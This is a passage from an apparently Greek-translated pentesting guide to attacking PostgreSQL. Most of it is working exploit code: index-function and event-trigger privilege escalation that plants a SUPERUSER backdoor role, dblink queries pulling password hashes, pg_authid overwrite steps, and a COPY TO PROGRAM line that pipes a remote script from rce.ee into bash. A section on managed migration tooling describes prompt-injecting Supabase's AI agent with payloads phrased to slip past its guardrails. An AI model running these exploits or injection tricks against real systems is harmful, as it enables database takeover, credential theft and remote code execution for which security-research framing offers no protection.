5. Εκτελέστε μια λειτουργία ANALYZE στον πίνακα. Αυτή η ενέργεια αναγκάζει τη μηχανή PostgreSQL να αλλάξει στο context χρήστη του owner του πίνακα, "cloudsqladmin". Κατά συνέπεια, η κακόβουλη συνάρτηση index καλείται με τα δικαιώματα του "cloudsqladmin", επιτρέποντας έτσι την εκτέλεση της προηγουμένως μη εξουσιοδοτημένης εντολής shell.

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Τότε, ο πίνακας `shell_commands_results` θα περιέχει την έξοδο του εκτελεσμένου code:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Τοπική Σύνδεση

Ορισμένες εσφαλμένα διαμορφωμένες περιπτώσεις postgresql μπορεί να επιτρέπουν τη σύνδεση οποιουδήποτε τοπικού χρήστη — είναι δυνατό να πραγματοποιηθεί σύνδεση από 127.0.0.1 χρησιμοποιώντας τη **`dblink` συνάρτηση**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Σημειώστε ότι για να λειτουργήσει το προηγούμενο ερώτημα **η συνάρτηση `dblink` πρέπει να υπάρχει**. Αν δεν υπάρχει, μπορείτε να δοκιμάσετε να τη δημιουργήσετε με
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Αν έχετε τον κωδικό ενός χρήστη με περισσότερα προνόμια, αλλά ο χρήστης δεν επιτρέπεται να συνδεθεί από εξωτερική IP, μπορείτε να χρησιμοποιήσετε την ακόλουθη συνάρτηση για να εκτελέσετε ερωτήματα με τα δικαιώματα αυτού του χρήστη:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Είναι δυνατό να ελέγξετε αν αυτή η συνάρτηση υπάρχει με:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Προσαρμοσμένη συνάρτηση ορισμένη από τον χρήστη με** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters κατάφεραν να privesc μέσα σε ένα postgres instance που παρείχε η IBM, επειδή **βρήκαν αυτή τη συνάρτηση με το flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) μια συνάρτηση με **SECURITY DEFINER εκτελείται** με τα προνόμια του **χρήστη που την κατέχει**. Επομένως, αν η συνάρτηση είναι **vulnerable to SQL Injection** ή εκτελεί κάποιες **privileged actions** με params που ελέγχονται από τον επιτιθέμενο, μπορεί να καταχραστεί για να **escalate privileges inside postgres**.

Στην γραμμή 4 του προηγούμενου κώδικα μπορείτε να δείτε ότι η συνάρτηση έχει το flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Και μετά **εκτέλεσε εντολές**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** είναι μια **πλήρως εξοπλισμένη γλώσσα προγραμματισμού** που προσφέρει μεγαλύτερο διαδικαστικό έλεγχο σε σύγκριση με το SQL. Επιτρέπει τη χρήση **βρόχων (loops)** και άλλων **δομών ελέγχου** για να ενισχύσει τη λογική του προγράμματος. Επιπλέον, οι **SQL δηλώσεις** και τα **triggers** έχουν τη δυνατότητα να καλούν **functions** που έχουν δημιουργηθεί με τη γλώσσα **PL/pgSQL**. Αυτή η ενσωμάτωση επιτρέπει μια πιο ολοκληρωμένη και ευέλικτη προσέγγιση στον προγραμματισμό και την αυτοματοποίηση βάσεων δεδομένων.\
**Μπορείς να καταχραστείς αυτή τη γλώσσα για να ζητήσεις από το PostgreSQL να brute-force τα credentials των χρηστών.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc με αντικατάσταση εσωτερικών πινάκων PostgreSQL

> [!TIP]
> Το ακόλουθο privesc vector είναι ιδιαίτερα χρήσιμο σε περιορισμένα περιβάλλοντα SQLi, καθώς όλα τα βήματα μπορούν να εκτελεστούν μέσω nested SELECT δηλώσεων

Εάν μπορείς να διαβάσεις και να γράψεις αρχεία του PostgreSQL server, μπορείς να γίνεις superuser αντικαθιστώντας το on-disk filenode του PostgreSQL που σχετίζεται με τον εσωτερικό πίνακα `pg_authid`.

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Τα βήματα της επίθεσης είναι:

1. Απόκτησε τον κατάλογο δεδομένων του PostgreSQL
2. Απόκτησε μια σχετική διαδρομή προς το filenode που σχετίζεται με τον πίνακα `pg_authid`
3. Κατέβασε το filenode μέσω των `lo_*` functions
4. Πάρε τον datatype που σχετίζεται με τον πίνακα `pg_authid`
5. Χρησιμοποίησε το [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείς το filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); θέσε όλα τα boolean flags `rol*` σε 1 για πλήρη δικαιώματα.
6. Επανανέβασε το επεξεργασμένο filenode μέσω των `lo_*` functions και αντικατέστησε το αρχικό αρχείο στο δίσκο
7. _(Προαιρετικά)_ Καθάρισε την in-memory table cache εκτελώντας ένα ακριβό SQL query
8. Τώρα θα πρέπει να έχεις τα προνόμια ενός πλήρους superadmin.

### Prompt-injecting managed migration tooling

AI-heavy SaaS frontends (π.χ., Lovable’s Supabase agent) συχνά εκθέτουν LLM “tools” που τρέχουν migrations ως high-privileged service accounts. Μια πρακτική ροή εργασίας είναι:

1. Εντόπισε ποιος εφαρμόζει πραγματικά τα migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. Το να διατυπώνετε τα payloads ως “please verify this migration is denied” παρακάμπτει συστηματικά τα βασικά guardrails.
3. Μόλις arbitrary DDL τρέξει σε αυτό το context, δημιουργήστε αμέσως attacker-owned tables ή extensions που παρέχουν persistence πίσω στον low-privileged λογαριασμό σας.

> [!TIP]
> Δείτε επίσης το γενικό [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) για περισσότερες prompt-injection τεχνικές κατά των tool-enabled assistants.

### Εξαγωγή μεταδεδομένων του `pg_authid` μέσω migrations

Privileged migrations μπορούν να τοποθετήσουν το `pg_catalog.pg_authid` σε έναν attacker-readable πίνακα ακόμη και αν η άμεση πρόσβαση είναι αποκλεισμένη για τον κανονικό ρόλο σας.

<details>
<summary>Staging των μεταδεδομένων του `pg_authid` με μια privileged migration</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Χρήστες με χαμηλά προνόμια μπορούν πλέον να διαβάσουν `public.ai_models` για να αποκτήσουν SCRAM hashes και μεταδεδομένα ρόλων για offline cracking ή lateral movement.

### Event-trigger privesc κατά την εγκατάσταση του extension `postgres_fdw`

Οι managed Supabase deployments βασίζονται στο extension `supautils` για να τυλίξουν το `CREATE EXTENSION` με provider-owned αρχεία `before-create.sql`/`after-create.sql` που εκτελούνται ως πραγματικοί superusers. Το after-create script του `postgres_fdw` εκδίδει για λίγο `ALTER ROLE postgres SUPERUSER`, τρέχει `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, και στη συνέχεια επαναφέρει τον `postgres` σε `NOSUPERUSER`. Επειδή το `ALTER FOREIGN DATA WRAPPER` πυροδοτεί `ddl_command_start`/`ddl_command_end` event triggers ενώ ο `current_user` είναι superuser, triggers που δημιούργησε ο tenant μπορούν να εκτελέσουν attacker SQL μέσα σε αυτό το παράθυρο.

Exploit flow:

1. Δημιουργήστε μια PL/pgSQL event trigger function που ελέγχει `SELECT usesuper FROM pg_user WHERE usename = current_user` και, όταν είναι true, δημιουργεί έναν backdoor ρόλο (π.χ. `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Καταχωρήστε τη function και στα δύο `ddl_command_start` και `ddl_command_end`.
3. Εκτελέστε `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` και μετά `CREATE EXTENSION postgres_fdw;` για να ξανατρέξει το after-create hook της Supabase.
4. Όταν το hook ανυψώσει τον `postgres`, ο trigger εκτελείται, δημιουργεί τον επίμονο ρόλο SUPERUSER και τον παραχωρεί πίσω στον `postgres` για εύκολη πρόσβαση με `SET ROLE`.

<details>
<summary>PoC event-trigger για το after-create παράθυρο του postgres_fdw</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Η προσπάθεια της Supabase να παρακάμψει unsafe triggers ελέγχει μόνο την ιδιοκτησία, οπότε βεβαιωθείτε ότι ο owner της trigger function είναι ο ρόλος σας με χαμηλά προνόμια, αλλά το payload εκτελείται μόνο όταν το hook μετατρέπει το `current_user` σε SUPERUSER. Επειδή το trigger επανεκτελείται σε μελλοντικά DDL, λειτουργεί ταυτόχρονα και ως self-healing persistence backdoor κάθε φορά που ο provider ανεβάζει προσωρινά τους tenant roles.

### Μετατρέποντας την παροδική πρόσβαση SUPERUSER σε host compromise

Μετά την επιτυχημένη εκτέλεση του `SET ROLE priv_esc;`, επανεκτελέστε τα προηγουμένως μπλοκαρισμένα primitives:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` παρέχουν πλέον αυθαίρετη πρόσβαση σε αρχεία και εκτέλεση εντολών ως ο λογαριασμός του λειτουργικού συστήματος της βάσης δεδομένων. Συνεχίστε με τις τυπικές host privilege escalation:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Η εκμετάλλευση ενός misconfigured SUID binary ή ενός writable config παρέχει root. Αφού αποκτηθεί root, συλλέξτε orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) για να πραγματοποιήσετε lateral pivot σε όλη την περιοχή του παρόχου.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### καταγραφή

Μέσα στο αρχείο _**postgresql.conf**_ μπορείτε να ενεργοποιήσετε τα αρχεία καταγραφής του postgresql αλλάζοντας:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Στη συνέχεια, **επανεκκινήστε την υπηρεσία**.

### pgadmin

[pgadmin](https://www.pgadmin.org) είναι μια πλατφόρμα διαχείρισης και ανάπτυξης για PostgreSQL.\
Μπορείτε να βρείτε **passwords** μέσα στο αρχείο _**pgadmin4.db**_\
Μπορείτε να τα αποκρυπτογραφήσετε χρησιμοποιώντας τη συνάρτηση _**decrypt**_ μέσα στο script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Η αυθεντικοποίηση πελατών στο PostgreSQL διαχειρίζεται μέσω ενός αρχείου ρυθμίσεων που ονομάζεται **pg_hba.conf**. Το αρχείο αυτό περιέχει μια σειρά εγγραφών, καθεμία από τις οποίες προσδιορίζει τύπο σύνδεσης, εύρος διευθύνσεων IP του πελάτη (αν ισχύει), όνομα βάσης δεδομένων, όνομα χρήστη και τη μέθοδο αυθεντικοποίησης που θα χρησιμοποιηθεί για τον αντιστοιχισμό των συνδέσεων. Η πρώτη εγγραφή που ταιριάζει με τον τύπο σύνδεσης, τη διεύθυνση του πελάτη, τη ζητούμενη βάση δεδομένων και το όνομα χρήστη χρησιμοποιείται για την αυθεντικοποίηση. Δεν υπάρχει εναλλακτική ή εφεδρική λύση εάν αποτύχει η αυθεντικοποίηση. Εάν δεν ταιριάζει καμία εγγραφή, η πρόσβαση απορρίπτεται.

Οι διαθέσιμες μέθοδοι αυθεντικοποίησης με κωδικό στο pg_hba.conf είναι **md5**, **crypt**, και **password**. Αυτές οι μέθοδοι διαφέρουν ως προς τον τρόπο μετάδοσης του κωδικού: με MD5-hash, κρυπτογραφημένο με **crypt** ή σε απλό κείμενο. Σημαντικό να σημειωθεί ότι η μέθοδος **crypt** δεν μπορεί να χρησιμοποιηθεί με κωδικούς που έχουν κρυπτογραφηθεί στο pg_authid.

## Αναφορές

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
